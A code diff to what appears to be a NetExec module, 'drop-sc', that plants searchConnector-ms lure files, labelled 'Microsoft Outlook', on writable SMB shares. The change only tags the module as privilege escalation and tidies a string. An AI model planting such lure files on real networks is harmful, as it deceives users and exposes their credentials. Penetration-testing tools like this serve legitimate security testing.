@@ -1,5 +1,6 @@
 import ntpath
 import tempfile
+from nxc.helpers.misc import CATEGORY
 
 
 class NXCModule:
@@ -12,6 +13,7 @@ class NXCModule:
     name = "drop-sc"
     description = "Drop a searchConnector-ms file on each writable share"
     supported_protocols = ["smb"]
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def options(self, context, module_options):
         """
@@ -45,7 +47,7 @@ class NXCModule:
             with open(self.scfile_path, "w") as scfile:
                 scfile.truncate(0)
                 scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
-                scfile.write("<searchConnectorDescription" ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">') # noqa ISC001
+                scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
                 scfile.write("<description>Microsoft Outlook</description>")
                 scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
                 scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
